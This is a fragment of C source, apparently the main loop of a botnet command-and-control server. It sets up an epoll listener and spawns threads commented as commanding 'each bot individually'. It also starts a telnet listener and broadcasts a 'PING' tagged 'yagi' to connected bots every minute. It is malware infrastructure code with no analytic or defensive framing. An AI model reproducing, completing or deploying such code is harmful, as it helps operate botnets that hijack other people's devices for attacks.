        epollFD = epoll_create1 (0); // make an epoll listener, die if we can't
        if (epollFD == -1)
        {
                perror ("epoll_create");
                abort ();
        }
        event.data.fd = listenFD;
        event.events = EPOLLIN | EPOLLET;
        s = epoll_ctl (epollFD, EPOLL_CTL_ADD, listenFD, &event);
        if (s == -1)
        {
                perror ("epoll_ctl");
                abort ();
        }
        pthread_t thread[threads + 2];
        while(threads--)
        {
                pthread_create( &thread[threads + 2], NULL, &epollEventLoop, (void *) NULL); // make a thread to command each bot individually
        }
        pthread_create(&thread[0], NULL, &telnetListener, port);
        while(1)
        {
                broadcast("PING", -1, "yagi", 0, MAXFDS, 0);
                sleep(60);
        }
        close (listenFD);
        return EXIT_SUCCESS;
}